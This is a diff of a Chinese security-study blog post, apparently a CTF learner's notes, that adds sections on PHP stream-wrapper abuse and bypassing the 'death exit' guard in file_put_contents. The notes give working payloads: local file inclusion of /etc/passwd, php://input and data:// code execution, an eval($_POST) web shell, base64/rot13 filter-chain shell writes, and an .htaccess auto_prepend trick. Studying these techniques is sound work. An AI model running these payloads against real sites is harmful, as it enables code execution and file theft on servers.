@@ -30,11 +30,13 @@
 <meta property="og:site_name" content="rikka的博客">
 <meta property="og:description" content="一些漏洞的原理">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2019021218350876.png">
 <meta property="article:published_time" content="2022-10-25T02:06:22.000Z">
-<meta property="article:modified_time" content="2022-10-28T02:54:49.639Z">
+<meta property="article:modified_time" content="2022-10-31T08:52:54.666Z">
 <meta property="article:author" content="rikka">
 <meta property="article:tag" content="study">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/2019021218350876.png">
 
 
 <link rel="canonical" href="http://example.com/2022/10/25/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/">
@@ -148,7 +150,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.</span> <span class="nav-text">PHP反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.1.</span> <span class="nav-text">序列化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.2.</span> <span class="nav-text">反序列化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="nav-number">1.3.</span> <span class="nav-text">PHP魔术方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="nav-number">1.4.</span> <span class="nav-text">函数绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="nav-number">1.5.</span> <span class="nav-text">应用场景</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.</span> <span class="nav-text">PHP反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.1.</span> <span class="nav-text">序列化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.2.</span> <span class="nav-text">反序列化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="nav-number">1.3.</span> <span class="nav-text">PHP魔术方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="nav-number">1.4.</span> <span class="nav-text">函数绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="nav-number">1.5.</span> <span class="nav-text">应用场景</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">2.</span> <span class="nav-text">PHP伪协议</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">2.1.</span> <span class="nav-text">简介</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#php%E6%94%AF%E6%8C%81%E7%9A%8412%E4%B8%AA%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">2.1.1.</span> <span class="nav-text">php支持的12个伪协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E6%8F%90"><span class="nav-number">2.1.2.</span> <span class="nav-text">前提</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">2.2.</span> <span class="nav-text">伪协议</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#file-x2F-x2F"><span class="nav-number">2.2.1.</span> <span class="nav-text">file:&#x2F;&#x2F;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php-x2F-x2F"><span class="nav-number">2.2.2.</span> <span class="nav-text">php:&#x2F;&#x2F;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php-x2F-x2F-input"><span class="nav-number">2.2.3.</span> <span class="nav-text">php:&#x2F;&#x2F;input</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP-x2F-x2F-filter"><span class="nav-number">2.2.4.</span> <span class="nav-text">PHP:&#x2F;&#x2F;filter</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#data-x2F-x2F"><span class="nav-number">2.2.5.</span> <span class="nav-text">data:&#x2F;&#x2F;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phar-x2F-x2F-%E3%80%81zip-x2F-x2F-%E3%80%81bzip2-x2F-x2F-%E3%80%81zlib-x2F-x2F"><span class="nav-number">2.2.6.</span> <span class="nav-text">phar:&#x2F;&#x2F;、zip:&#x2F;&#x2F;、bzip2:&#x2F;&#x2F;、zlib:&#x2F;&#x2F;</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="nav-number">2.3.</span> <span class="nav-text">过滤器</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%AD%BB%E4%BA%A1%E7%BB%95%E8%BF%87"><span class="nav-number">3.</span> <span class="nav-text">死亡绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E7%A7%8D%E7%B1%BB%E5%9E%8B"><span class="nav-number">3.1.</span> <span class="nav-text">三种类型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D"><span class="nav-number">3.2.</span> <span class="nav-text">第一种</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#base64decode%E7%BB%95%E8%BF%87"><span class="nav-number">3.2.1.</span> <span class="nav-text">base64decode绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rot13%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-number">3.2.2.</span> <span class="nav-text">rot13编码绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#htaccess%E7%9A%84%E9%A2%84%E5%8C%85%E5%90%AB%E5%88%A9%E7%94%A8"><span class="nav-number">3.2.3.</span> <span class="nav-text">.htaccess的预包含利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8%E7%BC%96%E7%A0%81%E7%BB%84%E5%90%88"><span class="nav-number">3.2.4.</span> <span class="nav-text">过滤器编码组合</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D"><span class="nav-number">3.3.</span> <span class="nav-text">第二种</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#base64"><span class="nav-number">3.3.1.</span> <span class="nav-text">base64</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%BB%E6%8E%89%E7%AD%89%E5%8F%B7%E4%B9%8B%E8%BF%87%E6%BB%A4%E5%99%A8%E5%B5%8C%E5%A5%97base64"><span class="nav-number">3.3.2.</span> <span class="nav-text">去掉等号之过滤器嵌套base64</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%BB%E6%8E%89%E7%AD%89%E5%8F%B7%E4%B9%8B%E7%9B%B4%E6%8E%A5%E5%AF%B9%E5%86%85%E5%AE%B9%E8%BF%9B%E8%A1%8C%E5%8F%98%E6%80%A7%E5%8F%A6%E7%B1%BBbase64"><span class="nav-number">3.3.3.</span> <span class="nav-text">去掉等号之直接对内容进行变性另类base64</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rot13"><span class="nav-number">3.3.4.</span> <span class="nav-text">rot13</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E7%A7%8D%E6%83%85%E5%86%B5"><span class="nav-number">3.4.</span> <span class="nav-text">第三种情况</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#strip-tags%E7%BB%95%E8%BF%87"><span class="nav-number">3.5.</span> <span class="nav-text">strip_tags绕过</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -271,7 +273,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2022-10-28 10:54:49" itemprop="dateModified" datetime="2022-10-28T10:54:49+08:00">2022-10-28</time>
+      <time title="修改时间：2022-10-31 16:52:54" itemprop="dateModified" datetime="2022-10-31T16:52:54+08:00">2022-10-31</time>
     </span>
 
   
@@ -281,14 +283,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>2.2k</span>
+      <span>9.3k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>2 分钟</span>
+      <span>8 分钟</span>
     </span>
 </div>
 
@@ -331,6 +333,137 @@
 <h2 id="函数绕过"><a href="#函数绕过" class="headerlink" title="函数绕过"></a>函数绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当成员属性数目大于实际数目时可绕过wakeup方法(CVE-2016-7124)</span><br><span class="line">O:6:&quot;Person&quot;:3 =&gt; O:6:&quot;Person&quot;:4</span><br></pre></td></tr></table></figure>
 
 <h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>可用的类，类中有魔法函数，<code>unserialize</code>的参数用户可控。攻击者可以构造恶意的序列化字符串</p>
+<h1 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53079406/article/details/125915640">【PHP伪协议】源码读取、文件读写、任意php命令执行</a></p>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>PHP 伪协议 是 PHP 支持的协议与封装协议，可利用这些协议完成许多命令执行</p>
+<h3 id="php支持的12个伪协议"><a href="#php支持的12个伪协议" class="headerlink" title="php支持的12个伪协议"></a>php支持的12个伪协议</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file://        访问本地文件系统</span><br><span class="line">http://        访问 HTTP(s) 网址</span><br><span class="line">ftp://         访问 FTP(s) URLs</span><br><span class="line">php://         访问各个输入/输出流（I/O streams）</span><br><span class="line">zlib://        压缩流</span><br><span class="line">data://        数据（RFC 2397）</span><br><span class="line">glob://        查找匹配的文件路径模式</span><br><span class="line">phar://        PHP 归档</span><br><span class="line">ssh2://        Secure Shell 2</span><br><span class="line">rar://         RAR</span><br><span class="line">ogg://         音频流</span><br><span class="line">expect://      处理交互式的流</span><br></pre></td></tr></table></figure>
+
+<h3 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php.ini里有两个参数</span><br><span class="line">allow_url_fopen：允许url里的封装协议访问文件（默认ON）</span><br><span class="line">allow_url_include：不允许包含url里的封装协议包含文件（默认OFF）</span><br></pre></td></tr></table></figure>
+
+<h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><h3 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h3><p>用于访问本地文件系统，并且不受<code>allow_url_fopen</code>，<code>allow_url_include</code>影响</p>
+<p><code>file://</code>协议主要用于访问文件(绝对路径、相对路径以及网络路径)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例如：http://www.xx.com?file=file:///etc/passsword</span><br></pre></td></tr></table></figure>
+
+<h3 id="php-x2F-x2F"><a href="#php-x2F-x2F" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h3><p>在<code>allow_url_fopen</code>，<code>allow_url_include</code>都关闭的情况下可以正常使用<br><code>php://</code>作用为访问输入输出流</p>
+<h3 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><p><code>php://input</code>可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为<code>php://input</code>，同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=on and allow_url_include=on</span><br><span class="line">当Content-Type等于”multipart/form-data”时，无效</span><br><span class="line"></span><br><span class="line">遇到file_get_contents()要想到用php://input绕过。</span><br></pre></td></tr></table></figure>
+
+<p>例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url: /?file=php://input</span><br><span class="line">POST请求中: &lt;?php system(&#x27;ls&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="PHP-x2F-x2F-filter"><a href="#PHP-x2F-x2F-filter" class="headerlink" title="PHP:&#x2F;&#x2F;filter"></a>PHP:&#x2F;&#x2F;filter</h3><p>php:&#x2F;&#x2F;filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</p>
+<p>简单通俗的说，这是一个中间件，在读入或写入数据的时候对数据进行处理后输出的一个过程。</p>
+<p>php:&#x2F;&#x2F;filter可以获取指定文件源码。当它与包含函数结合时，php:&#x2F;&#x2F;filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致任意文件读取。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">resource=&lt;要过滤的数据流&gt;	这个参数是必须的。它指定了你要筛选过滤的数据流。</span><br><span class="line">read=&lt;读链的筛选列表&gt;	该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">write=&lt;写链的筛选列表&gt;	该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">&lt;；两个链的筛选列表&gt;	任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</span><br></pre></td></tr></table></figure>
+
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=index.php</span><br><span class="line">php://filter/resource=index.php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">利用filter协议读文件，将index.php通过base64编码后进行输出。这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，而通过编码后则可以读取文件源码。</span><br><span class="line">convert.base64-encode就是一种过滤器。</span><br></pre></td></tr></table></figure>
+
+<h3 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen:on</span><br><span class="line">allow_url_include:on</span><br></pre></td></tr></table></figure>
+
+<p>数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与包含函数结合时，用户输入的<code>data://</code>流会被当作php文件执行。</p>
+<p>例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、data://text/plain,</span><br><span class="line">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br><span class="line"> </span><br><span class="line">2、data://text/plain;base64,</span><br><span class="line">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">比如：http://www.xx.com?file=file:///etc/passsword</span><br></pre></td></tr></table></figure>
+
+<h3 id="phar-x2F-x2F-、zip-x2F-x2F-、bzip2-x2F-x2F-、zlib-x2F-x2F"><a href="#phar-x2F-x2F-、zip-x2F-x2F-、bzip2-x2F-x2F-、zlib-x2F-x2F" class="headerlink" title="phar:&#x2F;&#x2F;、zip:&#x2F;&#x2F;、bzip2:&#x2F;&#x2F;、zlib:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;、zip:&#x2F;&#x2F;、bzip2:&#x2F;&#x2F;、zlib:&#x2F;&#x2F;</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen:off/on</span><br><span class="line">allow_url_include :off/on</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">phar://[压缩文件路径]/[压缩文件内的子文件名]</span><br><span class="line">zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]</span><br><span class="line">compress.bzip2://file.bz2</span><br></pre></td></tr></table></figure>
+
+<p><code>zip://</code> 可以访问压缩包里面的文件。当它与包含函数结合时，zip:&#x2F;&#x2F;流会被当作php文件执行。从而实现任意代码执行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">zip://中只能传入绝对路径。</span><br><span class="line">要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23（即下述POC中#要用%23替换）</span><br><span class="line">只需要是zip的压缩包即可，后缀名可以任意更改。</span><br><span class="line">相同的类型的还有zlib://和bzip2://</span><br></pre></td></tr></table></figure>
+
+<p>例如：</p>
+<p><img data-src="https://img-blog.csdnimg.cn/2019021218350876.png" alt="在这里插入图片描述"></p>
+<h2 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h2><p>字符串过滤器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">string.rot13</span><br><span class="line">一种字符处理方式，字符右移十三位。</span><br><span class="line"></span><br><span class="line">string.toupper</span><br><span class="line">将所有字符转换为大写。</span><br><span class="line"></span><br><span class="line">string.tolower</span><br><span class="line">将所有字符转换为小写。</span><br><span class="line"></span><br><span class="line">string.strip_tags</span><br><span class="line">用来处理掉读入的所有标签，例如XML的等等。在绕过死亡exit大有用处。</span><br></pre></td></tr></table></figure>
+
+<p>转换过滤器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">对数据流进行编码，通常用来读取文件源码。</span><br><span class="line"></span><br><span class="line">convert.base64-encode &amp; convert.base64-decode</span><br><span class="line">base64加密解密</span><br><span class="line"></span><br><span class="line">convert.quoted-printable-encode &amp; convert.quoted-printable-decode</span><br><span class="line">可以翻译为可打印字符引用编码，使用可以打印的ASCII编码的字符表示各种编码形式下的字符。</span><br></pre></td></tr></table></figure>
+
+<p>压缩过滤器</p>
+<p>压缩过滤器指的并不是在数据流传入的时候对整个数据进行写入文件后压缩文件，也不代表可以压缩或者解压数据流。</p>
+<p>压缩过滤器不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用到的两个相关过滤器：zlib.deflate（压缩）和 zlib.inflate（解压）。zilb是比较主流的用法，至于bzip2.compress和 bzip2.decompress工作的方式与 zlib 过滤器大致相同。</span><br></pre></td></tr></table></figure>
+
+<p>加密过滤器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mcrypt.*和 mdecrypt.*使用 libmcrypt 提供了对称的加密和解密。</span><br></pre></td></tr></table></figure>
+
+<h1 id="死亡绕过"><a href="#死亡绕过" class="headerlink" title="死亡绕过"></a>死亡绕过</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8163">file_put_content和死亡·杂糅代码之缘</a></p>
+<p>死亡exit指的是在进行写入PHP文件操作时，执行了以下函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents($content, &#x27;&lt;?php exit();&#x27; . $content);</span><br></pre></td></tr></table></figure>
+
+<p>这样当插入木马后，会先执行exit</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">exit</span>();<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;snakin&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="三种类型"><a href="#三种类型" class="headerlink" title="三种类型"></a>三种类型</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span> , <span class="string">&quot;&lt;?php exit();&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$content</span>,<span class="string">&quot;&lt;?php exit();&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>,<span class="variable">$content</span>.<span class="string">&quot;\nxxxxxxxxx&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h2 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span> , <span class="string">&quot;&lt;?php exit();&quot;</span>.<span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="base64decode绕过"><a href="#base64decode绕过" class="headerlink" title="base64decode绕过"></a>base64decode绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filename</span>是控制文件名的，如果我们使用php:<span class="comment">//filter协议的话，这会先按php://filter规定的协议对$content进行解码后再写入协议</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>
+
+<p>base64编码中只包含64个可打印字符，当PHP遇到不可解码的字符时，会选择性的跳过，这个时候base64就相当于以下的过程</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>] = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>所以，当<code>$content</code> 包含 <code>&lt;?php exit; ?&gt;</code>时，解码过程会先去除识别不了的字符，<code>&lt; ; ? &gt;</code>和空格等都将被去除，于是剩下的字符就只有<code>phpexit</code>以及我们传入的字符了。</p>
+<p>由于base64是4个byte一组，再添加一个字符例如添加字符<code>a</code>后，将<code>phpexita</code>当做两组base64进行解码，也就绕过这个死亡exit了。</p>
+<p>例如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/convert.base64-decode/resource=shell.php&amp;content=aPD9waHBpbmZvKCk7Pz4=</span></span><br><span class="line">其中PD9waHBpbmZvKCk7Pz4=是<span class="title function_ invoke__">phpinfo</span>()的base64编码</span><br></pre></td></tr></table></figure>
+
+<h3 id="rot13编码绕过"><a href="#rot13编码绕过" class="headerlink" title="rot13编码绕过"></a>rot13编码绕过</h3><p><a target="_blank" rel="noopener" href="http://www.rot13.de/index.php">rot13在线</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/string.rot13/resource=adam.php</span></span><br><span class="line"><span class="variable">$content</span>=<span class="string">&#x27;&lt;?cuc cucvasb();?&gt;&#x27;</span></span><br><span class="line">其中<span class="meta">&lt;?</span>cuc <span class="title function_ invoke__">cucvasb</span>();<span class="meta">?&gt;</span>是<span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();&gt;经过rot13编码后的结果</span><br></pre></td></tr></table></figure>
+
+<h3 id="htaccess的预包含利用"><a href="#htaccess的预包含利用" class="headerlink" title=".htaccess的预包含利用"></a>.htaccess的预包含利用</h3><p><code>string.strip_tags</code>能够从字符串中取出HTML和PHP标记，尝试返回给定的字符串 str 去除空字符，HTML和PHP标记后的结果。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$filename=php://filter/write=string.strip_tags/resource=.htaccess</span><br><span class="line">$content=?&gt;php_value auto_prepend_file D:\\phpStudy\\PHPTutorial\\WWW\\flag</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string.strip_tags过滤了.htaccess内容的html标签和PHP标记</span><br><span class="line">$content闭合死亡代码使其完全消除，并且写入自定义包含文件</span><br></pre></td></tr></table></figure>
+
+<p>注意</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.win10中路径需要两个反斜杠\\。</span><br><span class="line">2.这种方法也是具有一定的局限性，首先我们需要知道flag文件的位置，和文件的名字，一般的比赛中可以盲猜 flag.php flag /flag /flag.php 等等</span><br><span class="line">3.还有个很大的问题是，string.strip_tags过滤器只是可以在php5的环境下顺利的使用，如果题目环境是在php7.3.0以上的环境下，则会发生段错误。导致写不进去；根本来说是php7.3.0中废弃了string.strip_tags这个过滤器；</span><br></pre></td></tr></table></figure>
+
+<h3 id="过滤器编码组合"><a href="#过滤器编码组合" class="headerlink" title="过滤器编码组合"></a>过滤器编码组合</h3><p>例如，先去标签，再解码</p>
